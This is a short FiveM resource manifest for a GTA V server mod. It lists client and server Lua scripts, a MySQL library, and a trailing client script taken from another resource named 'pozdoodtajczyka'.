fx_version 'bodacious'
game 'gta5'

client_script 'client/client.lua'

server_script {
    '@mysql-async/lib/MySQL.lua',
    'server/server.lua'
}

client_script '@pozdoodtajczyka/client/main.lua'